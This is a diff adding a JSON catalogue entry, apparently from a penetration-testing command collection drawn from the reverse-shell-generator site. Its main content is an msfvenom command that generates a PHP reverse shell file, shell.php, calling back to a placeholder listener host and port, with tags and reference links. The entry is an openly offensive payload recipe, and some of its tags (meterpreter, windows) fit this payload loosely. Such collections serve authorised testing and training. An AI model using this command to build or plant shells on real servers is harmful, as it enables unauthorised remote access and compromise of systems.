@@ -1,0 +1,33 @@
+{
+  "id": "rsg-msfvenom-php-reverse-php",
+  "name": "RSG · MSFVenom · PHP Reverse PHP",
+  "command": "msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -o shell.php",
+  "description": "M S F Venom payload — PHP Reverse PHP (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "windows",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/PHP Reverse PHP/97",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
